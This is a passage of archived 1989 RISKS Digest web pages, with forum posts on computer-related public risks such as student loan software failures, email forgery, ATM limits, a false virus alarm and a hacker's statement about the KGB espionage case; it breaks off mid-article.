terminal and even write to it.  As one my guess this can lead to rather
vicious games between bored students.

     {..uunet..uwvax!uwmcsd1..}!marque!studsys!vanden
         {..uwvax..arpa..}!studsys.mu.edu!vanden
                vanden%studsys@marque.UUCP

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Social effects of viruses
</A>
</H3>
<address>
Don Alvarez 
&lt;<A HREF="mailto:boomer@space.mit.edu">
boomer@space.mit.edu
</A>&gt;
</address>
<i>
Mon, 6 Mar 89 22:01:24 EST
</i><PRE>

"Guy_Robinson.SBDERX&lt;"@Xerox.COM writes about a Marvel Comics android(?) that
gets wiped out by a computer virus and says:

&gt;One problem this situation raised was that the Vision's human WIFE was a little
&gt;distraught! Could this be a whole new type of RISK to bear in mind?

I have a similar story from my own life, in which my roommate came home one
night around 11:00pm to find me and my fiancee sitting, clearly very depressed,
unhappily in the living room.  He asked "what's the matter?" and my fiancee said
"Don has a virus, and he just got reinfected, and there's nothing he can do
about it."  Needless to say my roommate felt this was not a good time to hang
around and quickly disappeared.  Only much later that night did he hear me on
the phone to a friend in California (which was three hours behind us) and piece
together that (a) I did not have any conventional social diseases (b) the
infection was to my computer (c) the date was november 4th, 1988 (d) the virus
was the "internet virus of 1988" and (e) the reason I couldn't do anything
about it was that I couldn't get in as root over the modem.  Talk about RISKS
of computer viruses!
					- Don

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
 Previous message to risks misunderstood (Power failure problems,
</A>
</H3>
<address>

&lt;<A HREF="mailto:ADEGROOT@HROEUR5.BITNET">
ADEGROOT@HROEUR5.BITNET
</A>&gt;
</address>
<i>
Sat, 4 Mar 89 10:59 N
</i><PRE>
          <A HREF="/Risks/8.28.html">RISKS-8.28</A>)

I received some flak from my previous employer after a message from me appeared
in risks 8.28. Apparently they are even considering legal action ('though I'm
not sure about this (yet)).  I would like to set something straight...

-I never mentioned the company's name in my message. Their view seems to be
that this isn't necessary, as everybody knows I worked for them. I feel
flattered, but I don't think it's true. I never had a function that exposed me
to the public in any way.

-They feel the message is degrading the company's image.  Well, RISKS is meant
as a forum to relate the risks of modern day technology to people
professionally interested in those risks. It is not meant as a forum to make
fun of companies ('listen what happened to them...'), nor of their employees.
Despite this flak (which I consider to be a slight hiccup on their side), I
still like the company very much, and I consider having worked with the people
a great honour. I wouldn't think of insulting them in any way. They're great
professionals, and I learned a lot from them.  I also believe my message was
received professionally by the Risks Forum, mainly because of the reply in
<A HREF="/Risks/8.30.html">RISKS-8.30</A> by Jonathan I. Kamens, relating a very similar case that happened to
his University.  If you feel I did degrade the company's image (and also happen
to know the company's name), please send me a message. I would like to know how
many people agree with my previous employer's views on this...

-John Sinteur (mail to adegroot@hroeur5.bitnet)

     [RISKS Relevance sticklers may think that is not relevant.  However,
     because of the obvious risks of sending contributions to public
     BBoards, it seems relevant enough to include.  Please respond to John
     directly, although you may CC: RISKS-REQUEST (i.e., not for inclusion)
     if you wish.  PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.35.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.37.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-87</DOCNO>
<DOCOLDNO>IA013-000132-B047-153</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.37.html 128.240.150.127 19970217025932 text/html 22876
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:57:48 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 37</TITLE>
<LINK REL="Prev" HREF="/Risks/8.36.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.38.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.36.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.38.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 37</H1>
<H2> Saturday 11 March 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Computer blunders blamed for massive student loan losses 
</A>
<DD>
<A HREF="#subj1.1">
Rodney Hoffman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Prisoner access to confidential drivers' records 
</A>
<DD>
<A HREF="#subj2.1">
Rodney Hoffman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Ethics Question (Randall Neff)       [Adobe
</A>
<DD>
<A HREF="#subj3.1">
rman?
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Risk of congenial machinery 
</A>
<DD>
<A HREF="#subj4.1">
Robert Steven Glickstein
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Limitless ATM's 
</A>
<DD>
<A HREF="#subj5.1">
Geoff Kuenning
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Faking internet mail 
</A>
<DD>
<A HREF="#subj6.1">
Stephen Wolff
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Virus detector goes wrong 
</A>
<DD>
<A HREF="#subj7.1">
Dave Horsfall
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Re: News from the KGB/Wily Hackers 
</A>
<DD>
<A HREF="#subj8.1">
Hans Huebner = `pengo'
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  UK archive service [for European RISKS readers] 
</A>
<DD>
<A HREF="#subj9.1">
Dave Ferbrache
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Computer blunders blamed for massive student loan losses
</A>
</H3>
<address>
Rodney Hoffman 
&lt;<A HREF="mailto:Hoffman.ElSegundo@Xerox.com">
Hoffman.ElSegundo@Xerox.com
</A>&gt;
</address>
<i>
10 Mar 89 14:48:43 PST (Friday)
</i><PRE>

Bank of America and possibly other major international banks stand to lose
as much as $650 million on bad student loans, due to computer problems at
United Education and Software. 

The 'Wall Street Journal' for Friday, March 10, provides the first hints of
details I've seen on the nature of the "computer blunders" which earlier
stories hinted at.  The article, by Charles F. McCoy and Richard B.
Schmitt, is headlined UNITED EDUCATION'S COMPUTER BLUNDERS FORM VORTEX OF
BIG STUDENT LOAN FIASCO.  Excerpts:

   Computers at United Education and Software, Inc. ... ran wild for at
   least eight months.  They rejected payments from overdue borrowers
   and addressed collection notices intended for New Yorkers to such
   places as "Radio City, N.Y.," among other gaffes.  United Education
   and its colossal computer mistakes are at the heart of what is
   emerging as one of the most tangled loan fiascos in years... 
   
   The U.S. Dept. of Education has refused to honor guarantees on certain
   federally backed student loans serviced by United Education.  That 
   raises the possibility that BankAmerica  or other banks that backed
   the loans with letters of credit will have to shoulder huge defaults.
   BankAmerica served as trustee on the loans...  [Other banks, including
   Citicorp and several Japanese banks, dispute how much of the liability
   might be theirs, saying BankAmerica is responsible.]
   
   United Education's beserk computer produced records that are so fouled
   up that nobody knows how much the losses eventually will be.

   United Education and Software, oringinally a trade-school operator, 
   began servicing student loans in 1983, and grew rapidly, developing 
   a portfolio of more than $1 billion in less than five years... The 
   computer problems apparently stemmed from United Education's switch 
   to a new system in October 1987.  According to officials familiar with 
   the problems, United Education's programmers introduced major software 
   errors and failed to properly debug the new system.

   Among the results, according to a Dept. of Education audit report:  
   United Education sent delinquency notices to students who were still 
   in school and thus weren't scheduled even to begin payments on the loans.
   It placed students who were supposed to have been granted deferments 
   into default.  It didn't inform many laggard borrowers that they were
   delinquent, while informing some current borrowers that they were.  The
   computers also apparently logged telephone calls that were never made 
   and didn't log calls that were.  United Education applied payments to
   interest when they were supposed to be applied to interest and principal...
   
   Aaron Cohen, president of United Education, called the depth of the 
   problems identified by the audit a "shock."  He said the company was
   aware of bugs in the new software that were causing accounting errors,
   but had no idea its loan servicing operation had run amok.  He thought
   any problems were routine.  "Software companies have problems all the
   time," he said...

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Prisoner access to confidential drivers' records
</A>
</H3>
<address>
Rodney Hoffman 
&lt;<A HREF="mailto:Hoffman.ElSegundo@Xerox.com">
Hoffman.ElSegundo@Xerox.com
</A>&gt;
</address>
<i>
8 Mar 89 13:42:10 PST (Wednesday)
</i><PRE>

From a story by Leo Wolinsky in the 'Los Angeles Times' 5-March-89:

  If the [California Governor] Deukmejian Administration has its
  way, state prisoners soon will be put to work sorting through
  confidential motor vehicle records as part of the governor's plan
  to keep inmates working and save taxpayers money.
  
  But the program, which is set to begin July 1, is prompting con-
  cern among some lawmakers and other officials who worry that the
  records -- which include names, addresses and some financial
  information about California motorists -- might end up in the 
  hands of career criminals.
  
  "The concept boggles the mind," said Assemblyman Richard Katz,
  chairman of the Transportation Committee.  "They may be car thieves...
  They may have killed people or molested kids and now we're going to 
  give them access to home addresses of people along with [information
  on] loans that they have on their vehicles and what cars they drive.
  It seems like an open invitation for trouble."
  
  .... No one is sure what illicit uses, if any, inmates might make
  of the information.  But the Legislature's nonpartisan analyst
  charged in a report that procedures employed by the state "may not
  be adequate" to ensure the security of the documents.  "From our
  position, there is a fair amount that could be done even with this
  much information," said [one of the report authors]....
  
  [In an earlier, now cancelled mail sorting job,] some corrections 
  officers said they believe the inmates were searching for addresses 
  of prison officials .....

PS. It is not clear from the newspaper article whether the records involved
would be paper or on-line, so, strictly speaking, this may not involve any
computer-based system RISK.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Ethics Question 
</A>
</H3>
<address>
Randall Neff
&lt;<A HREF="mailto:neff@paradigm.STANFORD.EDU ">
neff@paradigm.STANFORD.EDU 
</A>&gt;
</address>
<i>
Fri, 10 Mar 89 17:28:55 PST
</i><PRE>

On Wednesday, March 8, Professor Michael A. Harrison, from the University of
California, Berkeley, made a presentation:  "VorTeX, a Multiple Representation
System" to the Stanford EE 380/CS 540 Computer System Colloquium.

As part of the VorTeX project, the group decided that they needed a graphical
display language, so they (re)implemented PostScript (trademark of Adobe 
Systems, Inc) on the Sun workstations.  Then they realized that they also
needed the fonts that are buried in the Apple LaserWriter.  They talked
to Adobe, but the money discussed was quite large (to Harrison) and he
objected to Adobe's attitude (quote "shove in your face").

So, the group wrote several clever pieces of software (PostScript program to
find the intersections of `scan' lines with the character boundaries, pump
results back to Suns, program to curve fit the coordinates, etc.), and
recreated the font information as Bezier cubic curves for use with their Sun
PostScript implementation.

According to the UC Berkeley lawyers, this is legal due to the current
copyright law, that digital encoding of fonts is not protected by copyright.
However, all Adobe sells is software and fonts; and the internal coding of
fonts is a trade secret.

THE ETHICS QUESTION ( I was really bothered by all of this ):

Is this ethically correct?   
Is it all right to acquire a company's product by clever coding?  
Is it reasonable behavior for a Famous CS department funded by California 
     taxpayers and NSF grants (it is certainly not research)?
Is there a reasonable way for an audience member to stand up and say:
    "For Shame, this is ethically reprehensible behavior and you're setting
     a bad example for students everywhere."

Randall Neff @ anna.stanford.edu

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Limitless ATM's
</A>
</H3>
<address>
&lt;<A HREF="mailto:@sri-unix.UUCP, geoff@itcorp.com">
@sri-unix.UUCP, geoff@itcorp.com
</A>&gt;
</address>
<i>
Sat, 4 Mar 89 03:31:21 -0500
</i><PRE>

Like many people, I've occasionally wanted to get a moderately large amount of
money out of an ATM, only to be foiled by a "daily limit" of some sort.  I
accepted this as a necessary evil for keeping thieves from completely cleaning
me out.

Recently, however, I had an experience that taught me a possible way around
these restrictions.  A credit card and the associated PIN were stolen from my
home, and the thief then used the card to withdraw $3900 in cash from ATM's.
Since the ATM's had a per-transaction limit of $300, the withdrawal was done in
13 separate transactions.  The interesting thing is that only two ATM's were
used for all of these operations! Further, the card only had a $3000 credit
limit, and about $600 was already in use.  I don't know the reason for the lack
of limits and restrictions, but I have begun to wonder just how much money I
could get away with if I systematically spent a few days taking all my credit
cards to ATM's and making withdrawals.
 
	Geoff Kuenning   geoff@ITcorp.com   uunet!desint!geoff

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Risk of congenial machinery
</A>
</H3>
<address>
Robert Steven Glickstein 
&lt;<A HREF="mailto:bobg+@andrew.cmu.edu">
bobg+@andrew.cmu.edu
</A>&gt;
</address>
<i>
Wed,  8 Mar 89 18:05:20 -0500 (EST)
</i><PRE>

An observation that I made earlier today:

I entered a store in the neighborhood with an old-fashioned mechanical cash
register, complete with the little "I just made a sale" bell.  I purchased an
item and after the transaction was complete, the clerk thanked me and wished me
a good afternoon.  I returned the pleasantry.

Later on I was in a much larger store, complete with barcode readers and
electronic cash registers with dot-matrix LED displays.  As the clerk rang up
my purchase, the cash register told me "Thank You For Shopping At &lt;Foo&gt;" and my
receipt said "Have a Good Day".  Perhaps because the dreary task of being
pleasant to customers was now automated, the clerk felt no need to greet me,
address me, look at me, or in any way acknowledge me except to take my money
and shove some change into my hand.

Computers do a lot of jobs a lot better than people, but there are some tasks
that should be performed by no one but humans.

Bob Glickstein, Information Technology Center, CMU, Pittsburgh, PA

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
 Re: Faking internet mail
</A>
</H3>
<address>
Stephen Wolff 
&lt;<A HREF="mailto:steve@note.nsf.gov">
steve@note.nsf.gov
</A>&gt;
</address>
<i>
Thu, 9 Mar 89 14:59:33 EST
</i><PRE>

From "Kevin S. McCurley" &lt;mccurley@IBM.com&gt; in RISKS DIGEST 8.29:

&gt; I guess a lot of people know about faking Internet mail.  Since the
&gt; National Science Foundation now accepts reviews of proposals via email, I
&gt; wonder whether anybody there knows about this ?

Yes, we know.  We also accept *proposals* electronically, so we have to face
problems of privacy, too.

&gt; It is rather farfetched to think that somebody would try to fake their
&gt; reviews,...

Nope, not at all.

These concerns are handled informally at present, but tighter methods are
on the way.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Virus detector goes wrong
</A>
</H3>
<address>
Dave Horsfall 
&lt;<A HREF="mailto:dave@stcns3.stc.oz.au">
dave@stcns3.stc.oz.au
</A>&gt;
</address>
<i>
Wed, 8 Mar 89 12:45:17 est
</i><PRE>

Taken from "Computing Australia", Feb 27:

``Sneaky little non-virus

  Sun Microsystems has moved to reassure Australian TOPS users that US
  reports on a virus are false.  In a virus-paranoid environment, US pc
  users of TOPS/Mac Version 2.1 were running their disks through a virus
  detector before loading the software onto their computers.

  It was a precaution that went wrong.  The particular virus detector
  was Interferon and it falsely reported TOPS infected with a virus known
  as Sneak, said TOPS/Macintosh product manager Timothy Fredel.  

  Fredel said the resource structure of TOPS/Macintosh 2.1 happens to
  look like a Sneak virus to Interferon.  To be on the safe side, Fredel
  suggested users run Virex or VirusRx.''

So now one can't trust one's virus detector any more...  On a different
note, have there been any (confirmed) reports of a fake virus detector?

Ahhh, the perils of a standard Applications Binary Interface...

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Re: News from the KGB/Wily Hackers
</A>
</H3>
<address>
Hans Huebner 
&lt;<A HREF="mailto:pengo@netcs.SMTP">
pengo@netcs.SMTP
</A>&gt;
</address>
<i>
Fri, 10 Mar 89 18:09:25 MET DST
</i><PRE>

In RISKS 8.36, Klaus Brunnstein mentioned my name in the context of the
hacker/espionage case recently discovered by the german authorities.  Since Mr.
Brunnstein is not competent to speak about the background of the case, I'd like
to add some clarification to prevent misunderstandings, especially concerning
my role.  I think it is a very bad practice to just publish names of people
without giving background information.  Roy Omond did this once to a friend of
mine, who has been a hacker as well, and his reputation in the net community
has suffered from this publication quite a lot, even if he was doing a favour
to the community by developing bug fixes and posting them to the net.

I have been an active member of the net community for about two years now, and
I want to explicitely express that my network activities have in no way been
connected to any contacts to secret services, be it western or eastern ones.
On the other hand, it is a fact that when I was younger (I'm 20 years now),
there has been a circle of persons which tried to make deals with an eastern
secret service.  I have been involved in this, but I hope that I did the right
thing by giving the german authorities detailed information about my
involvement in the case in summer '88.  As long as the lawsuit on this case is
not finished, I will/may not give any detailed about it to the public.  As soon
as I have the freedom to speak freely about all this, I'll be trying to give a
detailed picture about the happenings to anyone who's interested.

For my person:  I define myself as a hacker.  I acquired most of my knowledge
by playing around with computers and operating systems, and yes, many of these
systems were private property of organisations that didn't even have the
slightest idea that I was using their machines.  I think, hackers - persons who
creatively handle technology and not just see computing as their job - do a
service for the computing community in general.  It has been pointed out by
other people that most of the 'interesting' modern computer concepts have been
developed or outlined by people which define themselves as 'hackers'.

When I started hacking foreign systems, I was 16 years old.  I was just
interested in computers, not in the data which has been kept on their disks.
As I was going to school at that time, I didn't even have the money to buy an
own computer.  Since CP/M (which was the most sophisticated OS I could use on
machines which I had legal access to) didn't turn me on anymore, I enjoyed the
lax security of the systems I had access to by using X.25 networks.  You might
point out that I should have been patient and wait until I could go to the
university and use their machines.  Some of you might understand that waiting
was just not the thing I was keen on in those days.  Computing had become an
addiction for me, and thus I kept hacking.  I hope this clears the question
'why'.  It was definitely NOT to get the russians any advantage over the USA,
nor to become rich and get a flight to the Bahamas as soon as possible.  The
finish of the court trial will reveal this again, but until then I want to keep
rumours out that the german hackers were just the long (??) arm of the KGB to
incriminate western computer security or defense power.  

It should also be pointed out that the Chaos Computer Club has in no way been
connected to this recent case, and again, that the CCC as an organization has
never been a 'hacker group'.  The CCC merely handles the press for hackers, and
tries to point out implications of computers and communications for society in
general.

For punishment:  I already lost my current job, since through the publications
of my name in the SPIEGEL magazine and in RISKS, our business partners are
getting anxious about me being involved in this case.  Several projects I was
about to realise in the near future have been cancelled, which forces me to
start again at the beginning in some way.
                                                    -Hans Huebner
pengo@tmpmbx, pengo@garp.mit.edu, huebner@db0tui6.bitnet

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
UK archive service [for European RISKS readers] 
</A>
</H3>
<address>
Server 
&lt;<A HREF="mailto:infoadm@cs.heriot-watt.ac.uk">
infoadm@cs.heriot-watt.ac.uk
</A>&gt;
</address>
<i>
9 Mar 89 11:50:28 GMT
</i><PRE>

For the information of the European (especially UK) readers of the group,
their is an archive of Comp.risks newgroup postings maintained on the
Heriot-Watt information server.

The archive server is email based, and will accept requests in the
form of an email message to &lt;info-server@cs.hw.ac.uk&gt;,with the text:

request: comp.risks
topic: v8.1

where topic can be either:

index       for an index of all available risks digests (currently only 
            v7.96 to date, I am hoping to extend this backwards to the
            time of the Internet worm).

v8.index    for an index of all available digests in a specific volume

v8.contents for a list of the contents of all digests in a specified volume
            (contents lists are extracted and appended as new digests are
            received and may thus be slightly disorganised)

v8.1        to send a specific issue (in this case digest 1 in volume 8)

any number of topics can follow the request. The server also archives
virus-l digests, and holds BSD unix fixes, security software and virus
disinfection software. For a general index of available materials, send a
message of the form:

request: index
topic: index

Dave Ferbrache                            Personal mail to:
Dept of computer science                  Internet &lt;davidf@cs.hw.ac.uk&gt;
Heriot-Watt University                    Janet    &lt;davidf@uk.ac.hw.cs&gt;
79 Grassmarket                            UUCP     ..!mcvax!hwcs!davidf 
Edinburgh,UK. EH1 2HJ                     Tel      (UK) 031-225-6465 ext 553

                                                                 [Thanks!  PGN]
</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.36.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.38.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-88</DOCNO>
<DOCOLDNO>IA013-000132-B047-179</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.38.html 128.240.150.127 19970217030000 text/html 30047
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:58:26 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 38</TITLE>
<LINK REL="Prev" HREF="/Risks/8.37.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.39.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.37.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.39.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 38</H1>
<H2> Wednesday 15 March 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Water Bug - Computerization Messing Up Yacht Race 
</A>
<DD>
<A HREF="#subj1.1">
Robert Horvitz
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Sunspots &amp; Communications 
</A>
<DD>
<A HREF="#subj2.1">
Cliff Stoll
</A><br>
<A HREF="#subj2.2">
 PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  pengo and the Wily hackers 
</A>
<DD>
<A HREF="#subj3.1">
Klaus Brunnstein
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Toshiba DOS 3.3 Backup deletes files 
</A>
<DD>
<A HREF="#subj4.1">
Fiona M Williams
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Star Trek computer virus 
</A>
<DD>
<A HREF="#subj5.1">
Kevin Rushforth
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: NASA to replace top-level personnel with Expert Systems 
</A>
<DD>
<A HREF="#subj6.1">
Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Pushbutton Banking 
</A>
<DD>
<A HREF="#subj7.1">
Lynn R Grant
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Risks of telephone access to your bank account 
</A>
<DD>
<A HREF="#subj8.1">
Michael McClary
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Limitless ATMs 
</A>
<DD>
<A HREF="#subj9.1">
John Murray
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Re: Prisoner access to confidential drivers' records 
</A>
<DD>
<A HREF="#subj10.1">
Scot E Wilcoxon
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  Risks of Human Emulating Machinery 
</A>
<DD>
<A HREF="#subj11.1">
Jon Loux
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj12">
  New Sprint Card 
</A>
<DD>
<A HREF="#subj12.1">
Ken Harrenstien
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj13">
  Incoming-call identification 
</A>
<DD>
<A HREF="#subj13.1">
David Albert
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Water Bug - Computerization Messing Up Yacht Race
</A>
</H3>
<address>
Robert Horvitz
&lt;<A HREF="mailto:rh@well.UUCP ">
rh@well.UUCP 
</A>&gt;
</address>
<i>
Sat, 11 Mar 89 19:41:15 PST
</i><PRE>

An Irish friend, Derek Lynch, sent this article from the Irish Times' Sports
page (10 Feb 89).  Perhaps a British reader can provide the necessary
follow-up:
 
          "COMPUTER ERROR MAY PROVE COSTLY    by Dermot Gilleece
 
"A major decision with critical implications for Ireland's first involvement
in the Whitbread Round the World yacht race, will be taken in England next
week.  Race organisers, the Royal Naval Sailing Association, will be 
responding officially to a storm of criticism concerning the specifications
of competing yachts...
 
"The problem concerns the technique of measuring yachts which, in the context
of the Whitbread Race, are in the maxi, 70 foot class.  This is the
responsibility of the British-based Offshore Racing Council, which introduced
a new measuring process two years ago.
 
"Up to that stage, yachts were hand-measured, taking various complex factors,
even the size of the engine, into the equation.  It was then decided that
computers could handle the process more efficiently.
 
"In the event, a fault was discovered in the computer software with the result
that specifications were more liberal than intended.  So, the Offshore Racing
Council corrected the error last November.
 
"By then, however, two New Zealand yachts had been built according to the
faulty computer measurement...  The fact was that, while the New Zealand 
yachts measured 70 feet under the faulty process, their actual measurement
was 71 feet.
 
"The implications of this discovery were far-reaching.  Rear-Admiral Charles
Williams, chairman of the race committee, was bound by the new regulations
which, in effect, made the New Zealand craft illegal.  On the other hand,
if the New Zealand yachts were accepted into the Whitbread Race, they would
have a decided advantage over British and Irish craft - possibly by as much
as 10 hours in the 36,000 miles event, which will get under way in 
September...
 
"Butch Dalrymple-Smith is a partner in the company of Ron Holland, the
Cork-based designer of NCB Ireland.  He said last night:  `My view is that
the New Zealand boat which we know to be outside the limit, was built with
the computer loophole in mind.
 
"`We knew about the problem as far back as last July when the Americans
decided that yachts built to the faulty computer process were unacceptable.
Admittedly NCB Ireland was built at that stage but we could still have 
